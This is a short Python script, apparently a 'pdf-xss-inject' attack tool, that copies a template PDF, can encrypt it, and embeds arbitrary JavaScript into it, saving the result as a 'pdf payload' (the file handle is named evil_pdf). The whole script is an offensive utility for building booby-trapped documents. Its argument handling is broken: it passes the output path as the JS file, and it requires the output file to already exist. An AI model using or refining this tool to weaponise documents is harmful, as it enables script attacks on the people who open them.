import argparse
import os
try:
    from pypdf import PdfReader,PdfWriter
except ImportError as e:
    print(e)
    print("正在下载工具依赖项")
    os.system("pip install pypdf")


logo = """ 
            _  __                         _        _           _   
  _ __   __| |/ _|    __  _____ ___      (_)_ __  (_) ___  ___| |_ 
 | '_ \ / _` | |_ ____\ \/ / __/ __|_____| | '_ \ | |/ _ \/ __| __|
 | |_) | (_| |  _|_____>  <\__ \__ \_____| | | | || |  __/ (__| |_ 
 | .__/ \__,_|_|      /_/\_\___/___/     |_|_| |_|/ |\___|\___|\__|
 |_|                                            |__/               

"""

def cheak_file(file_path):
    # print(file_path)
    if not os.path.exists(file_path):
        raise FileExistsError("该文件不存在")
    if os.path.isdir(file_path):
        raise NotADirectoryError("该文件是一个目录,不是一个文件")
    return file_path

def pdf_js_inject(template_file_path,save_path,js_code:str=None,js_file:str=None,encrypt_password=None):
    output_pdf = PdfWriter()
    temp_pdf = PdfReader(template_file_path)

    for i in range(len(temp_pdf.pages)):
        page = temp_pdf.pages[i]
        output_pdf.add_page(page)

    if encrypt_password is not None:
        output_pdf.encrypt(encrypt_password,algorithm='AES-256')
        print("encrypt success")
    
    with open(save_path,'wb') as evil_pdf:
        if js_code is not None:
            output_pdf.add_js(js_code)
        if js_file is not None:
            with open(js_file,'r') as js:
                output_pdf.add_js(js.read())
        output_pdf.write(evil_pdf)

    print("\npdf inject js success\n")
        


if __name__ == "__main__":
    # print(logo)
    print(f"\033[38;2;255;0;0m{logo}\033[m")
    parse = argparse.ArgumentParser()
    parse.add_argument("-u",metavar="template.pdf",help="指定pdf模板",type=cheak_file,required=True)
    parse.add_argument("-o",metavar="save-path",help="将pdf payload报存在哪个路径",type=cheak_file,required=True)
    parse.add_argument("-e",metavar="encrype_password",help="输入要加密pdf的密码",type=str,nargs='?',const=None)

    group = parse.add_mutually_exclusive_group()
    group.add_argument("-j",metavar="JS",help="输入要注入的js代码",nargs='?',const=None)
    group.add_argument("-f",metavar="js-file",help="请输入带有js的文件",nargs='?',const=None)
    args = parse.parse_args()

    pdf_js_inject(args.u,args.o,args.j,args.o,args.e)

